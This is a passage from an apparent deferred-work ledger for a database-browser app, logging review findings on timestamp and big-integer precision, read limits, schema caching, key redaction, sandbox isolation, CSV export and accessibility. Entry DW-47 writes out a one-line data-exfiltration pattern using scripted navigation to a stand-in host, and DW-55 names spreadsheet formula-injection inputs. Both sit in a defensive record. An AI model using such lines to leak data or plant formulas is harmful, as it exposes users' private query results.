reason: `frozen-map.ts` routes any `Date` through `toIsoUtc`, which serializes with a `Z`/UTC suffix. A Postgres `timestamp without time zone` (and MySQL `DATETIME`) carries no timezone, but postgres.js/mysql2 hand it back as a JS `Date`; tagging it UTC asserts a timezone the column does not have, shifting displayed times for any non-UTC-intending data. Genuine `timestamptz` round-trips correctly; the gap is representational and only visible for naive-timestamp columns. Correcting it needs a contract decision (carry a naive-vs-aware distinction, or the SQL `dataType`) rather than a one-line mapper tweak — adjacent to the deferred SQL-`dataType`-aware typing item.
decision: [2026-07-21, user] Represent a `timestamp without time zone` as its literal wall-clock value (no `Z`, no UTC shift) — distinct from tz-aware timestamps.
status: open

### DW-35: Preserve MySQL `BIGINT` precision in the browse read path — the mysql2 connection uses default numeric handling, so a `BIGINT` above 2^53 comes back as a precision-lossy JS number and is displayed rounded

origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
location: `driver-mysql.ts`; `naturalKind` (`frozen-map.ts`)
reason: `driver-mysql.ts` opens the connection without `supportBigNumbers`/`bigNumberStrings`, so mysql2 decodes `BIGINT` columns to JS `number`; `frozen-map.ts` `naturalKind` then classifies the finite number as `"number"` and emits it verbatim, so a value like `9007199254740993` renders as `…992`. The mapper's bigint→string safety net only fires when the driver returns an actual `bigint`, which this config never produces for `BIGINT`. Rare (values beyond 2^53) and a driver-config/typing decision (enable big-number strings, or carry the SQL `dataType`) rather than a browse-composition bug; postgres.js already returns `int8` as a string and is unaffected.
decision: [2026-07-21, user] Carry large integers (bigint/int8/numeric above 2^53) as exact STRINGS end-to-end — read AND write AND PK addressing — so nothing is silently truncated. (Shared resolution with DW-40.)
status: open

### DW-36: Bound the FETCH (not just the display slice) for auto-classified raw reads — push a `LIMIT MAX_RESULT_ROWS + 1` or use a server cursor so a `SELECT * FROM huge_table` cannot materialize the whole result set into Core memory before the 1000-row cap applies

origin: migrated from legacy ledger (code review of spec-3-1-guarded-core-executor.md), 2026-07-12
location: `executeRaw` / `toRowsResult` (`executor.ts`)
reason: Reviewer severity: medium. `executor.ts` `executeRaw` read path runs `runReadOnly(stmt, [])` then `toRowsResult` slices to `MAX_RESULT_ROWS` AFTER the driver (postgres.js / mysql2) has already buffered every row in memory. The Core-side cap only bounds the response payload, not the fetch, so a large read OOMs the Core process. Story 3.1 explicitly scopes DB-side pagination/`LIMIT` to Story 3.2 ("a Core-side row cap is the only responsiveness measure here"), so this is a known-limitation deferral to the pagination story, not a 3.1 defect — but the current cap gives no memory protection.
status: done 2026-07-20
resolution: resolved by sweep bundle dw-raw-read-fetch-bound

### DW-37: Make the structured `createTable` type/constraint allowlist engine-aware — postgres-only tokens (`UUID`, `JSONB`, `TIMESTAMPTZ`, `SERIAL`, …) and bare `VARCHAR` (no length) compose invalid DDL on MySQL and fail opaquely at the engine

origin: migrated from legacy ledger (code review of spec-3-1-guarded-core-executor.md), 2026-07-12
location: `CREATE_TABLE_TYPES` / `executeCreateTable` (`executor.ts`)
reason: Reviewer severity: low. `executor.ts` `CREATE_TABLE_TYPES` is a single engine-blind allowlist; `executeCreateTable` emits the validated token verbatim. On MySQL a "valid" structured `createTable` carrying `UUID`/bare `VARCHAR` composes DDL the engine rejects → `internal_error`. Not a safety hole (values are still parameterized, identifiers quote-escaped, and it fails closed at the engine with no raw-text echo), purely a contract-quality gap; the fix is to gate/map type tokens per engine.
status: done 2026-07-20
resolution: resolved by sweep bundle dw-engine-aware-createtable-types

### DW-38: Map postgres raw-read result rows positionally (array row-mode) rather than by column name, so a `SELECT` with duplicate output column names (`SELECT id, id`, `a.id, b.id`) does not collapse same-named columns to a single (last) value

origin: migrated from legacy ledger (code review of spec-3-1-guarded-core-executor.md), 2026-07-12
location: `driver-postgres.ts` (`query`, pre-existing from Story 3.2)
reason: Reviewer severity: low. The postgres adapter (`driver-postgres.ts`, pre-existing from Story 3.2's `query`) builds row values keyed by column name; a raw `SELECT` can produce duplicate output names, and the object-keyed mapping then shows the last value for every duplicate, losing the distinct columns' data. Invisible for Story 3.2 browse (real table columns are unique); Story 3.1 exposes it by routing arbitrary raw `SELECT`s through the same mapping. Fix: use postgres.js array/`values()` row mode and align to the ordered column metadata (mysql already uses `rowsAsArray`).
status: done 2026-07-17
resolution: resolved by sweep bundle dw-postgres-positional-row-mapping

### DW-39: Document (or make configurable) the raw-SQL splitter's assumption of default session SQL modes — it assumes postgres `standard_conforming_strings = on` and MySQL default `sql_mode` (no `NO_BACKSLASH_ESCAPES`, no `ANSI_QUOTES`); non-default modes shift string/identifier boundaries

origin: migrated from legacy ledger (code review of spec-3-1-guarded-core-executor.md), 2026-07-12
location: `executor.ts` (raw-SQL splitter)
reason: Reviewer severity: low. `executor.ts` splitter activates backslash-escaping only for mysql strings and postgres `E'…'` strings. Under postgres `standard_conforming_strings=off`, plain `'…'` strings become backslash-active → splitter over-counts (valid statement falsely rejected — fail-safe). Under MySQL `NO_BACKSLASH_ESCAPES`, `'\''` is `\` + close-quote → splitter could under-count, but this is backstopped by the now-unconditional `multipleStatements:false`. All divergences are either over-reject (safe) or backstopped, and require a non-default server session config; the durable options are to read the session settings or document the assumption. No live exploit at default configs.
decision: [2026-07-21, user] Detect the session's actual SQL modes and adapt the raw-SQL splitter's string/identifier parsing accordingly (the most-correct option; over document-and-force).
status: open

### DW-40: Bind bigint/int8/numeric columns without JS `Number` precision loss on both the write value and the PK address — a value beyond `Number.MAX_SAFE_INTEGER` is silently truncated on edit/insert, and a lossy PK read makes `WHERE pk = <lossy>` address the wrong row (or none) on update/delete

origin: migrated from legacy ledger (code review of spec-3-3-edit-insert-delete-rows.md), 2026-07-12
location: `coerceValue` / `pkForRow` / `cellToValue` (`row-mutations.ts`)
reason: Reviewer severity: high (two independent review passes flagged it as the highest-consequence item in the diff). `row-mutations.ts` `coerceValue("number")` uses `Number(raw)` and `pkForRow`/`cellToValue` read the PK from `FrozenCell` as a JS `number` (`cell.value`). The precision loss originates upstream in Story 3.2's `FrozenCell` number representation (bigint already arrives as a lossy JS number from the browse read); Story 3.3 is the first to WRITE with it, exposing a silent wrong-value / wrong-row data-corruption path with no error surfaced. Story 3.3 explicitly scopes DB-type-aware editors via `SchemaColumnInfo` out (deferred) and documents the kind-inference limitation, so the durable fix (thread column types + carry wide integers as strings/bigint across the wire) belongs with that deferred type-threading work, not the 3.3 UI.
decision: [2026-07-21, user] SAME as DW-35 — exact-string end-to-end for large integers on both the write value and the PK address (WHERE pk = <exact string>), so update/delete can never address the wrong row via a lossy Number.
status: open

### DW-41: Reset `createdTables` on connect/disconnect so optimistically-created tables don't accumulate across reconnects and shadow the re-introspected schema

origin: migrated from legacy ledger (code review of spec-4-1-render-erd.md), 2026-07-12
location: `src/ui/App.tsx` (`createdTables`)
reason: `src/ui/App.tsx` only ever appends to `createdTables` (never clears it), so after a reconnect a created table appears in both `schemaTables` and `createdTables`, and after connecting to a different database a stale phantom table survives. Pre-existing Epic-3 lifecycle behavior masked by SchemaTree's dedup; the ERD's new dedup patch prevents the duplicate-id crash but the stale phantom node remains until this root cause is fixed.
folded: Epic 10 / Story 10.5 (multi-root tree keys optimistic `extraTables` per connectionId + clears on re-introspect/removal) — 2026-07-21
status: open (partial) — scoping half landed in Story 10.5 2026-07-22, residual below
resolution (partial): Story 10.5 landed the SCOPING half in full. `SchemaTree.tsx` (`ConnectionRoot`) merges `extraTables` via `mergeTables` **only into the boot root** (`descriptor.connectionId === null`); every saved-connection root renders its introspected tables verbatim, so an optimistic entry can no longer leak into a connection it does not belong to. Keying by "the boot sentinel for the default target" IS the per-connection scoping this entry asked for: create-table still executes id-less, so a created table can only ever belong to the boot target in this story. Connection-removal clearing is moot for the same reason: the boot target is a CLI/env boot argument and cannot be removed from Settings.
residual (still open, with reasons): the CLEARING half is WRITTEN BUT NOT YET REACHABLE, so no phantom is actually retired today. `App.tsx`'s `onSchemaLoaded` handler does filter out of `createdTables` every entry a fresh boot introspection already contains — but it runs only on the BOOT root's transition to `ready`, and in Story 10.5 that transition has exactly two triggers: (a) the mount effect, which fires once, before any table has been created in the session, and (b) "Reintentar", which `ConnectionRoot` renders only for a root already in `error`. A `ready` boot root has no path back to `loadRoot` (`toggleRoot` fetches only when `shouldFetchOnExpand(state)`, i.e. `state.kind === "idle"`), and `SchemaTree` never unmounts (`Workspace.tsx:344`, inside a permanently-rendered `<Panel>`; `App.tsx` renders `<Workspace>` unconditionally), so nothing remounts it either. The DW-45 post-DDL memo bust the original resolution text cited therefore never surfaces in the UI in this story: it makes the Core's NEXT `connect` re-introspect, but no next `connect` is ever issued for a healthy boot root. Net observable effect: an optimistically-created table stays in `createdTables` for the whole session and remains a phantom even after the DDL that made it real. Closing this needs a REACHABLE re-introspection path for a `ready` root (a refresh affordance, or an automatic re-`connect` after a successful DDL) — deliberately out of scope for 10.5, and the work left open here.

### DW-42: Exclude inherited partition FK constraints (`pg_constraint.conparentid <> 0`) from the Postgres FK introspection so partitioned schemas don't render N+1 redundant edges

origin: migrated from legacy ledger (code review of spec-4-1-render-erd.md), 2026-07-12
location: `src/core/driver-postgres.ts` (FK introspection)
reason: `src/core/driver-postgres.ts` filters only `contype='f'`; on a partitioned parent every partition carries an inherited copy of the FK, producing duplicate near-identical edges. Fix is a one-line `AND con.conparentid = 0` but carries a minor Postgres-version-compatibility consideration (conparentid exists in PG 11+), so it warrants focused attention.
status: done 2026-07-18
resolution: resolved by sweep bundle dw-introspection-query-fidelity

### DW-43: Preserve ERD layout stability when a table is created (avoid a full dagre reshuffle of every node) — naturally addressed alongside Story 4.2 layout persistence

origin: migrated from legacy ledger (code review of spec-4-1-render-erd.md), 2026-07-12
location: `src/ui/workspace/ErdTabView.tsx`
reason: `src/ui/workspace/ErdTabView.tsx` re-runs `schemaToGraph`+dagre whenever the `tables` identity changes, so creating a table via the Epic-3 builder jumps every node to a new position. Low severity (only pan/zoom context is preserved); best solved with the persisted-layout work in Story 4.2.
status: done 2026-07-15
resolution: already resolved: src/ui/workspace/ErdTabView.tsx:293-296 applyLayout(schemaToGraph(tables), positionsRef.current) overlays saved/dragged positions and re-seeds positionsRef on every graph change (319-322); erd-graph.ts:265-268 is the reshuffle-on-create fix — existing nodes keep positions, only a new table gets a fresh dagre spot. Story 4.2 resolved it.

### DW-44: Decide how to signal cross-database MySQL foreign keys instead of silently dropping their edges in the ERD

origin: migrated from legacy ledger (code review of spec-4-1-render-erd.md), 2026-07-12
location: `schemaToGraph` (ERD graph builder)
reason: When a MySQL connection names a database, columns are scoped to that schema but a FK may reference a table in another database; `schemaToGraph` then drops the edge as an "absent table" with no user indication a real relationship was omitted. Defensible for v1 but an explicit product decision (dangling-edge affordance vs. note vs. silent) is preferable.
decision: [2026-07-21, user] Draw the cross-database MySQL FK as a DISTINCT edge (dashed / labeled with the target database) to an external node or annotation, marked as cross-database — do not silently drop it.
status: open

### DW-45: `connectionManager.getSchema()` memoizes the schema at connect and never re-introspects, so chat context (and the "N tables" badge) goes stale after DDL runs (create/drop table)

origin: migrated from legacy ledger (code review of spec-5-2-chat-qa-schema-only.md), 2026-07-12
location: `src/core/connection.ts` (`getSchema`)
severity: medium
reason: `src/core/connection.ts` returns `cached.schema` fixed at first connect; Story 3.4/3.x DDL mutates the live DB but no re-introspection path exists. Surfaced by 5.2 which now feeds that cached schema to the AI provider.
folded: Epic 10 / Story 10.4 (extend `connectionTargets` invalidation to bust the resolved target's memoized schema after a schema-mutating `execute`, so the next getSchema/connect re-introspects) — 2026-07-21
status: done 2026-07-21
resolution: resolved by Story 10.4 — `ConnectionManager.invalidateSchema()` busts the memo IN PLACE (a stale flag + a single-flight re-introspect under the same pinned scope), surfaced as a `ConnectionSeams.invalidateSchema` seam so `executor.ts` scopes the bust to the target it just mutated (confirmed raw mutation + successful `createTable` only). Eviction-based invalidation was rejected: it cannot reach the boot manager, which `resolve(null)` returns and `server.ts` owns.

### DW-46: Provider-key redaction in the chat error path is exact-substring only (`rawCause.split(apiKey).join("***")`), so a key echoed in a non-literal form (URL-encoded, base64, truncated, or nested in a structured error object) would still reach stderr

origin: migrated from legacy ledger (code review of spec-5-4-streaming-reasoning.md), 2026-07-12
location: `answer()` / `answerStream` (chat provider redaction path)
severity: high
reason: Inherited from Story 5.2's `answer()` redaction and reused verbatim by 5.4's `answerStream` (including the SDK-emitted `error`-part path). No current provider (Anthropic/OpenAI/Google) echoes the API key in error bodies, so this is latent; a stronger guarantee (redact encoded/partial forms, or emit a fixed generic cause) is preferable given the "key NEVER in any log" invariant.
status: done 2026-07-20
resolution: resolved by sweep bundle dw-provider-key-redaction-hardening

### DW-47: Scripted same-frame navigation (`window.location = "http://host/?" + data`) bypasses `connect-src 'none'`, so a hostile guest can still exfiltrate the user's private `FrozenData`; the "already-public frozen data" comments understate this

origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
location: sandbox `pushData` / CSP (spec-5-5 crossorigin JS sandbox)
severity: high
reason: CSP fetch directives (`connect-src`, `img-src`) do not govern top-level/self navigation, and `sandbox="allow-scripts"` without `allow-top-navigation` still permits a frame to navigate ITSELF. The pushed `FrozenData` is the user's real query output, not public data. Closing this is a genuine architectural/security decision (e.g. gating `pushData` on a confirmed handshake so data never lands in a navigated-away frame, and/or a documented residual) rather than a trivial patch — the `pushData(frame, "*")` target-origin is deliberately `"*"` against the guest's opaque origin.
decision: [2026-07-21, user] ACCEPT the risk (guest-visible data is already the user's own) — document as out-of-scope, mirroring the DW-36 Option-A posture. RESIDUAL to record explicitly: a hostile/shared report could still exfiltrate FrozenData via scripted same-frame navigation; revisit if untrusted/shared reports are ever introduced. (User chose accept over the recommended sandbox-navigation block.)
status: open

### DW-48: In exposed mode (`QS_HOST=0.0.0.0`) the sandbox server binds the same wildcard host as Core (LAN-exposing the tokenless guest) while the injected `__QS_SANDBOX_ORIGIN__` is normalized to `127.0.0.1:<port>`, which is unreachable for a remote browser — the sandbox silently fails to load off-host

origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
location: `startCore` (sandbox `Bun.serve`, `bindHost`); `deriveOpenUrl`
severity: medium
reason: `startCore` passes `bindHost` straight into the sandbox `Bun.serve`, and `deriveOpenUrl` rewrites the injected origin to loopback. The intent-contract Block-If explicitly reserves the exposure model as a human security decision, so the correct exposed-mode posture (loopback-only sandbox + documented "visualization unavailable when exposed", or a reachable remote origin) is a deliberate call, not an unattended patch.
decision: [2026-07-21, user] Keep the sandbox bound to LOOPBACK even when the Core is exposed (QS_HOST=0.0.0.0) — never LAN-expose the tokenless guest — and document that report visualizations only render on the host machine in exposed mode. (Closes problem (a); avoids the false-success of (b).)
status: open

### DW-49: The guest→host signal stream (`height`/`error`/`datum-clicked`) is unbounded in rate/count, so a hostile guest can flood `onSignal` — and via `SandboxFrame`'s `setHeight` a React re-render — thrashing the Ring 2 main thread

origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
location: `onSignal` / `SandboxFrame` (`setHeight`)
severity: low
reason: `isSandboxOutbound` caps `error.message` length but nothing coalesces or rate-limits frames; each valid `height` triggers `setHeight`. Best addressed when Story 5.6 wires the real renderer (debounce/coalesce height via rAF, rate-limit `onSignal`); no containment breach, but a cheap render-thrash DoS from untrusted code.
status: done 2026-07-15
resolution: already resolved: src/ui/.../SandboxFrame.tsx:109-133 createHeightCoalescer collapses a height flood to one setHeight per animation frame (wired at 196) plus a MAX_FRAME_HEIGHT clamp (147,235) — the cited setHeight/React-render-thrash vector is closed by Story 5.6. (Residual raw onSignal count is unbounded but inert — no render thrash.)

### DW-50: `SandboxFrame` binds the iframe `contentWindow` exactly once at mount; a null-at-mount window or a later guest-frame reload silently kills the channel (host never built, or the identity gate drops every subsequent message) with no rebind or diagnostic

origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
location: `SandboxFrame` (mount `useEffect`, `event.source === iframeWindow` identity gate)
severity: low
reason: The mount `useEffect` has empty deps and returns early if `contentWindow` is null; the host's identity gate is `event.source === iframeWindow` against that single captured window. Both fail closed (no leak) but produce a silently dead sandbox. Re-resolving `contentWindow` on the iframe `load` event and rebuilding/rebinding the host would harden it; low urgency while the component is unwired, natural to fix when 5.6 mounts it for real.
status: done 2026-07-15
resolution: already resolved: SandboxFrame.tsx:157,182-222,243 rebuilds the host from the live contentWindow on every iframe `load` (loadNonce effect) and rebindHost retries a null-at-load window up to 60 ticks, re-pushing the current doc — no silently dead channel. Story 5.6 resolved it.

### DW-51: `SandboxFrame` documents `data: null` as "renders an empty guest", but a non-null→null transition pushes nothing, so the guest keeps displaying the prior draw — the documented empty state never happens

origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
location: `SandboxFrame.tsx:36` (contract) / `SandboxFrame.tsx:109` (`if (loaded && data !== null)`)
severity: low
reason: `SandboxFrame.tsx:36` promises the empty-guest behavior; `SandboxFrame.tsx:109` guards `if (loaded && data !== null)` and never clears. A correct fix (push an empty `FrozenData` that passes the guard's `decode`, or restate the contract) needs the empty-state semantics 5.6 will define, so it is deferred rather than papered over.
status: done 2026-07-15
resolution: already resolved: SandboxFrame.tsx:49-58 pushRenderDoc uses `doc ?? EMPTY_RENDER_DOC` (doc-change effect 226-228), so a non-null→null transition clears the prior draw via the guest's replaceChildren — the documented empty state now happens. Story 5.6 resolved it.

### DW-52: In the Live Report runtime, a `connections.list` failure at initial load leaves the top-level "cannot reach quick-studio" banner and the Default-only picker permanently stale — a later Refresh re-queries and renders live data but never re-lists connections nor clears the banner

origin: migrated from legacy ledger (code review of spec-6-4-export-live-report.md), 2026-07-12
location: `src/live-report/runtime.ts` (`runLiveReport`, `runAll`, `loadConnections`)
severity: low
reason: `src/live-report/runtime.ts` `runLiveReport` calls `loadConnections` once and `host.setStatus(CANNOT_REACH_HTML)` on failure; `runAll` (wired to both the picker and Refresh) only re-issues `execute` per query block — it never re-attempts `loadConnections`, clears the top-level status, nor rebuilds the picker. So recovered data is shown beneath a contradictory failure notice with named connections missing until a full page reload. Trigger is narrow (connections.list fails at load, Core recovers, viewer clicks Refresh) and data stays correct with full-reload recovery, so consequence is low/cosmetic; the correct fix is a re-entrant connection-reload + replaceable-picker refactor (must preserve the run-generation concurrency guard and the current pick), disproportionate to jam into an unattended follow-up review — deferred for focused attention.
status: done 2026-07-20
resolution: resolved by sweep bundle dw-live-report-connection-reload

### DW-53: No dedicated component tests exercise the workspace shell (`Workspace`/`TabBar`/`SchemaTree`/`App`), so its roles, aria, and `data-testid`s ship without a regression net

origin: review of spec-7-1-redesign-shell-neutral.md, 2026-07-14
source_spec: `spec-7-1-redesign-shell-neutral.md`
location: `src/ui/workspace/TabBar.tsx`, `src/ui/schema/SchemaTree.tsx`, `src/ui/workspace/Workspace.tsx`, `src/ui/App.tsx`
severity: low
reason: The shell's `role="tab"`/`aria-selected`/`aria-pressed`/`aria-label="Schema tables"` and the `health`/`settings-toggle`/`create-table-toggle`/`exposure-banner` testids are load-bearing for a11y and were preserved as a hard constraint, but no `*.test.tsx` renders these four components — they are asserted nowhere. The story's "keep every passing test green" only covers unrelated suites (ChatTabView/QueryTabView/ErdTabView/ReportTabView/ConfirmRun/etc.), so the activation/disclosure semantics, the connection-status dot, and the light-theme flip could all regress unnoticed. Pre-existing gap surfaced by this review; adding shell render tests is worthwhile focused work, not part of a presentation-only pass.
status: open

### DW-54: The shell's destructive/error reds are hardcoded dark-tuned Tailwind classes (`text-red-400`/`bg-red-500`/`bg-red-500/10`) that do not flip under `:root[data-theme="light"]`, so on the new light theme they render low-contrast on white surfaces — tokenize them (e.g. a themed `--destructive`/`--err` pair) when the light theme is completed across Epic 7

origin: review of spec-7-1-redesign-shell-neutral.md, 2026-07-14 (follow-up review pass)
source_spec: `spec-7-1-redesign-shell-neutral.md`
location: `src/ui/App.tsx` (ConnectionIndicator error dot), `src/ui/schema/SchemaTree.tsx` (`role="alert"` error text + conn-row error dot), `src/ui/workspace/Workspace.tsx` (status-bar Stop, ExposureBanner)
severity: low
reason: The neutral shell keeps the pre-existing Tailwind `red-400`/`red-500` scale for functional destructive/error color (spec-sanctioned: "the Tailwind red-* scale used elsewhere in the UI"), and the new `:root[data-theme="light"]` block added in this story flips surfaces/ink/type-colors but NOT these reds. On light surfaces a dark-theme-tuned `red-400` foreground reads at reduced contrast. Latent today: light theme has no toggle UI and is an explicitly-incomplete, mid-Epic-7 surface (documented residual risk in this spec's Verification). The durable fix is a themed destructive/err token pair swapped in for the hardcoded classes, done as part of completing the light theme across the remaining Epic 7 surfaces — out of scope for a presentation-only shell pass.
folded: Epic 10 / Story 10.5 (10.5 already tokenizes SchemaTree's reds → --err/--err-soft; extends the same swap to the remaining shell reds in App.tsx/Workspace.tsx). If any surface is out of 10.5's reach, leave DW-54 partially open with the residual listed. — 2026-07-21
status: open (partial) — swapped in Story 10.5 2026-07-22, residual below
resolution (partial): Story 10.5 tokenized every shell red it could reach without a contrast regression — `SchemaTree.tsx` (the `.conn-row` dot disappeared with the header the multi-root rewrite deleted; the tree-level `role="alert"` went `text-red-400` → `text-err`, and the new per-root error dot/message use `bg-err`/`--err-soft`/`text-err` from birth), `App.tsx:176` ConnectionIndicator and `App.tsx:216` SaveIndicator (`bg-red-500` → `bg-err`), and `Workspace.tsx:414` the status-bar Stop button (`text-red-400` → `text-err`, `hover:bg-red-500/10` → `hover:bg-err-soft`). `grep -rn "red-400\|red-500" src/ui/schema/SchemaTree.tsx src/ui/App.tsx` is now empty, and a render test asserts the tree carries no raw red.
residual (still open, with reasons): (1) `Workspace.tsx:201-210` `ExposureBanner` — a filled white-on-red alarm where `red-600` measures ~4.8:1 against white and `--err` (#ef6a63) only ~2.9:1, so tokenizing it would trade a theming defect for an accessibility one; it is the ONLY permitted red left in `Workspace.tsx`. (2) There are still no `:root[data-theme="light"]` values for `--err`/`--err-soft`/`--err-line` — a deliberate Story-7.3 dark-first decision documented at `globals.css:75-80`, so the swap improves token consistency but does NOT yet fix light-theme contrast; reversing it is a theme decision, not a UI story's call. (3) The raw `red-*`/`amber-*` in `DataGrid.tsx:481`, `CreateTablePanel.tsx:39,71,241` and `TabContent.tsx:388-411` are outside this story's surface and untouched.

### DW-55: The new client-side CSV Export does not guard against CSV/formula injection — a string cell beginning with `=`, `+`, `-`, or `@` is written verbatim and executes as a formula when the exported file is opened in Excel/Sheets

origin: review of spec-7-2-redesign-tables-grid-neutral.md, 2026-07-15
source_spec: `spec-7-2-redesign-tables-grid-neutral.md`
location: `src/ui/data/grid-view.ts` (`csvField`/`rowsToCsv`)
severity: medium
reason: `rowsToCsv`'s `csvField` quotes only fields containing `,`/`"`/newline (exactly the escaping the spec prescribed) — it does not neutralize leading formula sigils. Because a DB browser exports arbitrary row content, a cell like `=SUM(A1)`/`+cmd`/`-2+3`/`@foo` becomes a live formula in a spreadsheet app. This is a genuine (well-known) export vulnerability, but the fix is a policy decision the presentation-only spec deliberately did not scope: the common mitigation (prefixing a `'` or tab) MUTATES exported data and many DB tools intentionally preserve fidelity instead. Worth a focused decision + follow-up rather than silently altering export output in an unattended pass.
decision: [2026-07-21, user] Prefix-guard the CSV export — prepend a `'` to any cell starting with `= + - @` (and tab/CR) — the standard OWASP formula-injection mitigation.
status: open

### DW-56: Clicking the result-bar Add-Row ("row") button opens the in-grid insert draft at the bottom of the scrollable table body with no scroll-into-view, so on a full/scrolled page the click appears to do nothing

origin: review of spec-7-2-redesign-tables-grid-neutral.md, 2026-07-15
source_spec: `spec-7-2-redesign-tables-grid-neutral.md`
location: `src/ui/workspace/TabContent.tsx` (Add-Row button → `setInsertOpen(true)`), `src/ui/data/DataGrid.tsx` (`InsertDraftRow` renders at the end of `<tbody>` inside the scroll container)
severity: low
reason: The spec required Add-Row to "open/reuse the existing in-grid insert-draft flow" and it does — the draft expands at the bottom of `<tbody>`. But the toolbar button lives at the top of the panel and the draft can be off-screen in a scrolled/full page, so the user gets no visible feedback that the click registered. Fixing it needs a ref + `scrollIntoView` (or a focus handoff) added to `DataGrid`, extra surface beyond the presentation-only reskin. Real but low-consequence UX polish — deferred for focused attention.
status: open

### DW-57: The result-bar insert draft (`insertOpen`) is not reset on page navigation, so a draft opened (and partially typed) on one page stays open with stale values after Prev/Next loads a different page

origin: review of spec-7-2-redesign-tables-grid-neutral.md, 2026-07-15
source_spec: `spec-7-2-redesign-tables-grid-neutral.md`
location: `src/ui/workspace/TabContent.tsx` (`insertOpen` state; `InsertDraftRow` value state in `src/ui/data/DataGrid.tsx` — the grid is keyed per table, not per page, so its local draft values persist across page changes)
severity: low
reason: `insertOpen` (lifted so the toolbar Add-Row can open the same draft) is only cleared on insert success (`InsertDraftRow.reset()`); `setPage`/prev/next never reset it, and the grid is remounted per bound table (not per page) so `InsertDraftRow`'s local `values` persist too. Paging with a half-filled draft open leaves it open over the newly loaded page with the prior page's typed values. A safe fix is a small `useEffect(() => setInsertOpen(false), [page])` plus a draft-values reset, but it was left out of the presentation pass to avoid adding reset logic near the fetch effect the spec froze. Low-consequence UX edge — deferred.
status: open

### DW-58: The redesigned Confirm button paints white text on the new `--err` fill (`#ef6a63`), a ~3:1 contrast ratio that falls below WCAG AA (4.5:1) for its 12.5px semibold label

origin: review of spec-7-3-redesign-query-confirm-neutral.md, 2026-07-15
source_spec: `spec-7-3-redesign-query-confirm-neutral.md`
location: `src/ui/workspace/ConfirmRun.tsx` (`footerButtons`, the `bg-[var(--err)] text-white` Confirm button)
severity: medium
reason: The white-on-`--err` fill is a faithful port of `confirm-destructive.html` (`.dx-btn-danger { background: var(--err); color: #fff }`), which the spec designates the visual source of truth — so following the contract produced it. The fix (darken `--err`, or the label) is an epic-wide `--err` design-token decision touching every destructive surface, not an isolated component tweak, and it slightly deviates from the prototype the spec mandates. Deferred to a focused a11y/contrast pass over the Epic 7 `--err`/`--warn` palette rather than a unilateral change in a presentation-only story.
decision: [2026-07-21, user] Darken the `--err` fill (or the on-err text) so the Confirm button label reaches >=4.5:1 WCAG AA — a small token tweak, no design-language change.
status: open

### DW-59: `ConfirmRun` declares `role="alertdialog"` + `aria-modal="true"` but does not enforce modality — no focus trap, no scrim-click dismiss, and background content stays tabbable

origin: review of spec-7-3-redesign-query-confirm-neutral.md, 2026-07-15
source_spec: `spec-7-3-redesign-query-confirm-neutral.md`
location: `src/ui/workspace/ConfirmRun.tsx` (the `alertdialog` card + `fixed inset-0` scrim)
severity: medium
reason: The prototype markup (and the port) assert `aria-modal="true"`, but the component adds no focus trap and the scrim has no dismiss handler, so a keyboard/AT user can Tab out to the page behind the "modal" and a screen reader announces a boundary that isn't kept. This is a genuine modal-a11y gap, but it is shared across all three callers (Query/Chat/Report) and a proper focus trap is real behavior beyond a presentation-only reskin — best done once as a dedicated shared-modal a11y pass for the epic. Not a regression from the prior inline panel (which claimed no modality at all).
status: open

### DW-60: `ConfirmRun`'s `position: fixed` overlay is rendered in-tree (no portal), so it anchors to an ancestor instead of the viewport if any ancestor establishes a containing block (`transform`/`filter`/`will-change`/`contain`)

origin: review of spec-7-3-redesign-query-confirm-neutral.md, 2026-07-15
source_spec: `spec-7-3-redesign-query-confirm-neutral.md`
location: `src/ui/workspace/ConfirmRun.tsx` (`fixed inset-0` root), rendered inside `QueryTabView`/`ChatTabView`/`ReportTabView` trees
severity: low
reason: `QueryTabView`'s own root is transform-free today, so the full-screen scrim resolves against the viewport as intended. But the modal is rendered in place (not via a React portal), so a future shell/panel ancestor that applies `transform`/`filter` (common for animations) would silently clip or mis-center it. The durable fix is a portal to `document.body`, which changes the render path and is out of scope for a presentation-only port. Latent fragility, surfaced for the record.
status: open

### DW-61: The optional `affectedRows` badge renders for any numeric value — `0`, negative, or `NaN` all paint the red "N rows" badge, and pluralization only special-cases `=== 1`

origin: review of spec-7-3-redesign-query-confirm-neutral.md, 2026-07-15
source_spec: `spec-7-3-redesign-query-confirm-neutral.md`
location: `src/ui/workspace/ConfirmRun.tsx` (the `affectedRows !== undefined` badge)
severity: low
reason: `affectedRows` is a prop-gated preview with NO Core source today (the `confirmation_required` preview carries only `sql`+`risk`), so this branch is dormant until a future story wires it. When wired, a `0`/negative/`NaN` value would render a misleading red "0 rows"/"-5 rows"/"NaN rows" destruction badge. The right place to add the `Number.isFinite && >= 0` guard (and richer pluralization) is the story that supplies the data with real semantics — deferred with it.
status: open

### DW-62: The optional `objectName` type-to-confirm gate bypasses on empty string and is unmatchable for whitespace-bearing names (`typed.trim() === objectName` trims only the left side)

origin: review of spec-7-3-redesign-query-confirm-neutral.md, 2026-07-15
source_spec: `spec-7-3-redesign-query-confirm-neutral.md`
location: `src/ui/workspace/ConfirmRun.tsx` (`TypeToConfirmSection` mount gate `objectName !== undefined` + `match = typed.trim() === objectName`)
severity: low
reason: `objectName` is a prop-gated escalated-friction input with no Core source today (dormant). Two boundary bugs live in the dormant path: `objectName === ""` passes the `!== undefined` mount gate and matches an empty input immediately (friction fully bypassed), and a name with leading/trailing whitespace can never equal a `.trim()`-ed input (Confirm permanently disabled). Because the gate is UX-only (the Core is the real authorizer) and unreachable until wired, the mount guard (`.trim() !== ""`) and symmetric trimming belong to the story that feeds real object names. Deferred.
status: open

### DW-63: The `objectName` type-to-confirm input stays editable while `busy` is true, even though both footer buttons disable — an inconsistent frozen state during an in-flight round-trip

origin: review of spec-7-3-redesign-query-confirm-neutral.md, 2026-07-15
source_spec: `spec-7-3-redesign-query-confirm-neutral.md`
location: `src/ui/workspace/ConfirmRun.tsx` (`TypeToConfirmSection` `<input>`, no `disabled={busy}`)
severity: low
